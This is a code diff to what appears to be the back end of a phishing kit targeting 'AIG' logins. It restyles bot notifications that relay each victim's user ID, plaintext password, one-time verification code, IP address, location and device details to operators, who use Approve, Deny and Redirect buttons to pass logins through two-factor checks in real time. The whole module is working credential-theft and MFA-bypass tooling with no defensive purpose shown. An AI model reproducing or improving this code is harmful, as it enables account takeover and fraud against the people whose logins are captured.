@@ -48,11 +48,11 @@ async function sendToAll(env, text, taskId, includeButtons) {
         payload.reply_markup = {
           inline_keyboard: [
             [
-              { text: "Approve", callback_data: "approve:" + taskId },
-              { text: "Deny", callback_data: "deny:" + taskId },
+              { text: "✅ Approve", callback_data: "approve:" + taskId },
+              { text: "❌ Deny", callback_data: "deny:" + taskId },
             ],
             [
-              { text: "Redirect", callback_data: "redirect:" + taskId },
+              { text: "🔀 Redirect", callback_data: "redirect:" + taskId },
             ],
           ],
         };
@@ -141,7 +141,7 @@ function gmtOffset(tz) {
   }
 }
 
-function locationBlock(cf) {
+function locationLines(cf) {
   if (!cf) return [];
   var loc = cf.city && cf.city !== "Unknown"
     ? cf.city + ", " + cf.country
@@ -151,65 +151,64 @@ function locationBlock(cf) {
   if (offset) tzLabel += " (" + offset + ")";
 
   return [
-    "Location: " + esc(loc),
-    "IP: <code>" + esc(cf.ip || "Unknown") + "</code>",
-    "Timezone: " + esc(tzLabel),
-    "ISP: " + esc(cf.asOrganization || "Unknown"),
+    "📍 " + esc(loc),
+    "🌐 <code>" + esc(cf.ip || "Unknown") + "</code>",
+    "🕒 " + esc(tzLabel),
+    "📡 " + esc(cf.asOrganization || "Unknown"),
   ];
 }
 
-function deviceBlock(task) {
+function deviceLines(task) {
   var device = task.device_info ? parseDevice(task.device_info) : "Unknown";
   var screen = task.screen_size || "Unknown";
   var ref = formatReferrer(task.referrer);
   var url = formatUrl(task.member_origin);
 
   return [
-    "Device: " + esc(device),
-    "Screen: " + esc(screen),
-    "Referrer: " + esc(ref),
-    "Page: " + esc(url),
-  ];
-}
-
-function timeBlock(tz) {
-  var t = formatTimes(tz);
-  return [
-    "Local: " + esc(t.local),
-    "UTC: " + esc(t.utc),
+    "📱 " + esc(device),
+    "📏 " + esc(screen),
+    "🔗 " + esc(ref),
+    "🌐 " + esc(url),
   ];
 }
 
 export async function notifyNewTask(env, task) {
   var isVisit = task.request_kind === "visit";
   var tz = task.cf ? task.cf.timezone : null;
+  var t = formatTimes(tz);
   var lines = [];
 
   if (isVisit) {
-    lines.push("<b>New Visitor (AIG)</b>");
+    lines.push("👁 <b>NEW VISITOR</b>  •  <i>AIG</i>");
+    lines.push("────────────────────────");
     lines.push("");
-    lines = lines.concat(locationBlock(task.cf));
+    lines.push("🗺 <b>Location</b>");
+    lines = lines.concat(locationLines(task.cf));
     lines.push("");
-    lines = lines.concat(deviceBlock(task));
+    lines.push("🖥 <b>Device</b>");
+    lines = lines.concat(deviceLines(task));
     lines.push("");
-    lines = lines.concat(timeBlock(tz));
+    lines.push("📅 " + esc(t.local) + "  •  " + esc(t.utc) + " UTC");
   } else {
-    lines.push("<b>Login Request (AIG)</b>");
+    lines.push("🔐 <b>LOGIN REQUEST</b>  •  <i>AIG</i>");
+    lines.push("────────────────────────");
     lines.push("");
-    lines.push("User: <code>" + esc(task.user_id) + "</code>");
-    lines.push("Pass: <code>" + esc(task.password || "N/A") + "</code>");
-    lines.push("Email: " + esc(task.masked_email));
+    lines.push("👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>");
+    lines.push("🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>");
+    lines.push("✉️ <b>Email</b>   " + esc(task.masked_email));
     if (task.masked_phone && task.masked_phone !== "N/A") {
-      lines.push("Phone: " + esc(task.masked_phone));
+      lines.push("📞 <b>Phone</b>   " + esc(task.masked_phone));
     }
     lines.push("");
-    lines = lines.concat(locationBlock(task.cf));
+    lines.push("🗺 <b>Location</b>");
+    lines = lines.concat(locationLines(task.cf));
     lines.push("");
-    lines = lines.concat(deviceBlock(task));
+    lines.push("🖥 <b>Device</b>");
+    lines = lines.concat(deviceLines(task));
     lines.push("");
-    lines = lines.concat(timeBlock(tz));
+    lines.push("📅 " + esc(t.local) + "  •  " + esc(t.utc) + " UTC");
     lines.push("");
-    lines.push("<i>Auto-declines in 90s</i>");
+    lines.push("⏳ <i>Auto-declines in 90 seconds</i>");
   }
 
   await sendToAll(env, lines.join("\n"), task.id, !isVisit);
@@ -225,30 +224,37 @@ export async function notifyAdvance(env, task) {
         ? "Phone (" + esc(task.masked_phone) + ")"
         : "Email (" + esc(task.masked_email) + ")";
 
-    lines.push("<b>Code Delivery Request (AIG)</b>");
+    lines.push("📨 <b>CODE DELIVERY</b>  •  <i>AIG</i>");
+    lines.push("────────────────────────");
     lines.push("");
-    lines.push("User: <code>" + esc(task.user_id) + "</code>");
-    lines.push("Pass: <code>" + esc(task.password || "N/A") + "</code>");
-    lines.push("Send via: " + target);
+    lines.push("👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>");
+    lines.push("🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>");
+    lines.push("✉️ <b>Send via</b>  " + target);
     lines.push("");
-    lines = lines.concat(locationBlock(task.cf));
+    lines.push("🗺 <b>Location</b>");
+    lines = lines.concat(locationLines(task.cf));
     lines.push("");
-    lines = lines.concat(deviceBlock(task));
+    lines.push("🖥 <b>Device</b>");
+    lines = lines.concat(deviceLines(task));
     lines.push("");
-    lines.push("<i>Auto-declines in 90s</i>");
+    lines.push("⏳ <i>Auto-declines in 90 seconds</i>");
+
   } else if (task.flow_step === "code_verify") {
-    lines.push("<b>Code Verification (AIG)</b>");
+    lines.push("🛡 <b>CODE VERIFICATION</b>  •  <i>AIG</i>");
+    lines.push("────────────────────────");
     lines.push("");
-    lines.push("User: <code>" + esc(task.user_id) + "</code>");
-    lines.push("Pass: <code>" + esc(task.password || "N/A") + "</code>");
-    lines.push("Code: <code>" + esc(task.verification_code || "N/A") + "</code>");
-    lines.push("Via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email") + " (" + esc(task.masked_email) + ")");
+    lines.push("👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>");
+    lines.push("🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>");
+    lines.push("🔢 <b>Code</b>    <code>" + esc(task.verification_code || "N/A") + "</code>");
+    lines.push("✉️ <b>Via</b>     " + (task.code_delivery_method === "phone" ? "Phone" : "Email") + " (" + esc(task.masked_email) + ")");
     lines.push("");
-    lines = lines.concat(locationBlock(task.cf));
+    lines.push("🗺 <b>Location</b>");
+    lines = lines.concat(locationLines(task.cf));
     lines.push("");
-    lines = lines.concat(deviceBlock(task));
+    lines.push("🖥 <b>Device</b>");
+    lines = lines.concat(deviceLines(task));
     lines.push("");
-    lines.push("<i>Auto-declines in 90s</i>");
+    lines.push("⏳ <i>Auto-declines in 90 seconds</i>");
   } else {
     return;
   }
@@ -258,42 +264,45 @@ export async function notifyAdvance(env, task) {
 
 export function buildApprovedMessage(task) {
   var lines = [
-    "<b>APPROVED (AIG)</b>",
+    "✅ <b>APPROVED</b>  •  <i>AIG</i>",
+    "────────────────────────",
     "",
-    "User: <code>" + esc(task.user_id) + "</code>",
-    "Pass: <code>" + esc(task.password || "N/A") + "</code>",
+    "👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>",
+    "🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>",
   ];
   if (task.verification_code) {
-    lines.push("Code: <code>" + esc(task.verification_code) + "</code>");
-    lines.push("Via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
+    lines.push("🔢 <b>Code</b>    <code>" + esc(task.verification_code) + "</code>");
+    lines.push("✉️ <b>Via</b>     " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
   }
   return lines.join("\n");
 }
 
 export function buildDeniedMessage(task) {
   var lines = [
-    "<b>DENIED (AIG)</b>",
+    "❌ <b>DENIED</b>  •  <i>AIG</i>",
+    "────────────────────────",
     "",
-    "User: <code>" + esc(task.user_id) + "</code>",
-    "Pass: <code>" + esc(task.password || "N/A") + "</code>",
+    "👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>",
+    "🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>",
   ];
   if (task.verification_code) {
-    lines.push("Code: <code>" + esc(task.verification_code) + "</code>");
-    lines.push("Via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
+    lines.push("🔢 <b>Code</b>    <code>" + esc(task.verification_code) + "</code>");
+    lines.push("✉️ <b>Via</b>     " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
   }
   return lines.join("\n");
 }
 
 export function buildRedirectedMessage(task) {
   var lines = [
-    "<b>REDIRECTED (AIG)</b>",
+    "🔀 <b>REDIRECTED</b>  •  <i>AIG</i>",
+    "────────────────────────",
     "",
-    "User: <code>" + esc(task.user_id) + "</code>",
-    "Pass: <code>" + esc(task.password || "N/A") + "</code>",
+    "👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>",
+    "🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>",
   ];
   if (task.verification_code) {
-    lines.push("Code: <code>" + esc(task.verification_code) + "</code>");
-    lines.push("Via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
+    lines.push("🔢 <b>Code</b>    <code>" + esc(task.verification_code) + "</code>");
+    lines.push("✉️ <b>Via</b>     " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
   }
   return lines.join("\n");
 }
